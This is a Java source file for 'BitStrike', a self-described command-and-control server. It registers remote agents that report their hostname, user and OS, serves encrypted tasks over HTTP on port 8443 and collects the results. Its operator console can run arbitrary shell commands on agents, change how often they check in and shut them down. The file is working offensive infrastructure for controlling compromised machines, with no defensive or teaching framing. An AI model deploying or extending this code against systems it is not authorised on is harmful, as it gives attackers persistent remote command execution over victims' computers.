package com.bitstrike.server;

import static spark.Spark.*;

import com.bitstrike.crypto.CryptoUtil;
import com.bitstrike.models.Agent;
import com.bitstrike.models.Command;
import com.bitstrike.models.Command.CommandType;
import com.bitstrike.utils.JsonUtil;
import com.google.gson.Gson;
import com.google.gson.JsonObject;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

/**
 * BitStrike C2 Server - Main class that handles agent communication
 * and provides a console interface for the operator.
 */
public class BitStrikeServer {
    private static final Logger logger = LoggerFactory.getLogger(BitStrikeServer.class);
    private static final int PORT = 8443;
    private static final AgentManager agentManager = new AgentManager();
    private static final Gson gson = new Gson();
    private static final CryptoUtil crypto = new CryptoUtil();
    
    public static void main(String[] args) {
        setupServer();
        startConsole();
    }
    
    private static void setupServer() {
        port(PORT);
        
        // Enable HTTPS
        // In Phase 1, we'll use a self-signed certificate for simplicity
        // For a real deployment, a proper certificate should be used
        // secure("keystore.jks", "password", null, null);
        
        // Register routes
        post("/register", (req, res) -> {
            try {
                // Extract agent info from request
                String payload = req.body();
                String decrypted = crypto.decrypt(payload);
                JsonObject agentInfo = gson.fromJson(decrypted, JsonObject.class);
                
                String agentId = req.headers("X-Agent-ID");
                String hostname = agentInfo.get("hostname").getAsString();
                String username = agentInfo.get("username").getAsString();
                String osVersion = agentInfo.get("os_version").getAsString();
                String ipAddress = req.ip();
                
                // Register the agent
                Agent agent = agentManager.registerAgent(agentId, hostname, username, osVersion, ipAddress);
                
                // Prepare response
                Map<String, String> response = new HashMap<>();
                response.put("agent_id", agent.getId());
                response.put("status", "registered");
                
                res.status(200);
                return crypto.encrypt(gson.toJson(response));
            } catch (Exception e) {
                logger.error("Error registering agent", e);
                res.status(500);
                return crypto.encrypt("{\"error\": \"Internal server error\"}");
            }
        });
        
        get("/tasks", (req, res) -> {
            try {
                String agentId = req.headers("X-Agent-ID");
                if (agentId == null || agentId.isEmpty()) {
                    res.status(401);
                    return crypto.encrypt("{\"error\": \"Unauthorized\"}");
                }
                
                Agent agent = agentManager.getAgent(agentId);
                if (agent == null) {
                    res.status(404);
                    return crypto.encrypt("{\"error\": \"Agent not found\"}");
                }
                
                // Update last seen
                agent.updateLastSeen();
                
                // Check if there are any commands for this agent
                if (agent.hasCommands()) {
                    Command cmd = agent.getNextCommand();
                    Map<String, Object> response = new HashMap<>();
                    response.put("command_id", cmd.getId());
                    response.put("type", cmd.getType().toString());
                    response.put("content", cmd.getCommand());
                    
                    res.status(200);
                    return crypto.encrypt(gson.toJson(response));
                } else {
                    // No commands, send empty response
                    res.status(204);
                    return "";
                }
            } catch (Exception e) {
                logger.error("Error processing task request", e);
                res.status(500);
                return crypto.encrypt("{\"error\": \"Internal server error\"}");
            }
        });
        
        post("/results", (req, res) -> {
            try {
                String agentId = req.headers("X-Agent-ID");
                if (agentId == null || agentId.isEmpty()) {
                    res.status(401);
                    return crypto.encrypt("{\"error\": \"Unauthorized\"}");
                }
                
                Agent agent = agentManager.getAgent(agentId);
                if (agent == null) {
                    res.status(404);
                    return crypto.encrypt("{\"error\": \"Agent not found\"}");
                }
                
                // Update last seen
                agent.updateLastSeen();
                
                // Process command result
                String payload = req.body();
                String decrypted = crypto.decrypt(payload);
                JsonObject resultInfo = gson.fromJson(decrypted, JsonObject.class);
                
                String commandId = resultInfo.get("command_id").getAsString();
                String output = resultInfo.get("output").getAsString();
                boolean success = resultInfo.get("success").getAsBoolean();
                
                agentManager.setCommandResult(agentId, commandId, output, success);
                
                res.status(200);
                return crypto.encrypt("{\"status\": \"result_received\"}");
            } catch (Exception e) {
                logger.error("Error processing result submission", e);
                res.status(500);
                return crypto.encrypt("{\"error\": \"Internal server error\"}");
            }
        });
        
        // Error handling
        exception(Exception.class, (e, req, res) -> {
            logger.error("Unhandled exception", e);
            res.status(500);
            res.body("{\"error\": \"Internal server error\"}");
        });
        
        // Log startup
        logger.info("BitStrike C2 server started on port {}", PORT);
    }
    
    private static void startConsole() {
        Scanner scanner = new Scanner(System.in);
        printHelp();
        
        while (true) {
            System.out.print("BitStrike> ");
            String input = scanner.nextLine();
            String[] parts = input.trim().split("\\s+", 2);
            String command = parts[0].toLowerCase();
            
            try {
                switch (command) {
                    case "help":
                        printHelp();
                        break;
                    case "list":
                        listAgents();
                        break;
                    case "shell":
                        if (parts.length < 2) {
                            System.out.println("Usage: shell <agent_id> <command>");
                        } else {
                            String[] cmdParts = parts[1].trim().split("\\s+", 2);
                            if (cmdParts.length < 2) {
                                System.out.println("Usage: shell <agent_id> <command>");
                            } else {
                                sendShellCommand(cmdParts[0], cmdParts[1]);
                            }
                        }
                        break;
                    case "sleep":
                        if (parts.length < 2) {
                            System.out.println("Usage: sleep <agent_id> <seconds>");
                        } else {
                            String[] sleepParts = parts[1].trim().split("\\s+", 2);
                            if (sleepParts.length < 2) {
                                System.out.println("Usage: sleep <agent_id> <seconds>");
                            } else {
                                sendSleepCommand(sleepParts[0], sleepParts[1]);
                            }
                        }
                        break;
                    case "kill":
                        if (parts.length < 2) {
                            System.out.println("Usage: kill <agent_id>");
                        } else {
                            sendKillCommand(parts[1].trim());
                        }
                        break;
                    case "exit":
                    case "quit":
                        System.out.println("Shutting down BitStrike C2 server...");
                        shutdown();
                        scanner.close();
                        System.exit(0);
                        break;
                    default:
                        System.out.println("Unknown command. Type 'help' for available commands.");
                }
            } catch (Exception e) {
                System.out.println("Error: " + e.getMessage());
            }
        }
    }
    
    private static void printHelp() {
        System.out.println("BitStrike C2 Console");
        System.out.println("-------------------");
        System.out.println("Available commands:");
        System.out.println("  help                - Show this help");
        System.out.println("  list                - List all connected agents");
        System.out.println("  shell <id> <cmd>    - Execute shell command on agent");
        System.out.println("  sleep <id> <sec>    - Set agent sleep interval");
        System.out.println("  kill <id>           - Terminate agent");
        System.out.println("  exit                - Exit the C2 server");
    }
    
    private static void listAgents() {
        System.out.println("Connected agents:");
        System.out.println("----------------");
        
        if (agentManager.getAllAgents().isEmpty()) {
            System.out.println("No agents connected");
            return;
        }
        
        for (Agent agent : agentManager.getAllAgents()) {
            System.out.println(agent);
        }
    }
    
    private static void sendShellCommand(String agentId, String command) {
        if (agentManager.addCommand(agentId, command, CommandType.SHELL)) {
            System.out.println("Shell command sent to agent " + agentId);
        } else {
            System.out.println("Failed to send command: Agent not found");
        }
    }
    
    private static void sendSleepCommand(String agentId, String seconds) {
        try {
            int sleepTime = Integer.parseInt(seconds);
            if (agentManager.addCommand(agentId, String.valueOf(sleepTime), CommandType.SLEEP)) {
                System.out.println("Sleep interval updated for agent " + agentId);
            } else {
                System.out.println("Failed to send command: Agent not found");
            }
        } catch (NumberFormatException e) {
            System.out.println("Invalid sleep time: " + seconds);
        }
    }
    
    private static void sendKillCommand(String agentId) {
        if (agentManager.addCommand(agentId, "", CommandType.KILL)) {
            System.out.println("Kill command sent to agent " + agentId);
        } else {
            System.out.println("Failed to send command: Agent not found");
        }
    }
    
    /**
     * Stops the server
     */
    public static void shutdown() {
        logger.info("Shutting down server...");
        stop();
        System.exit(0);
    }
} 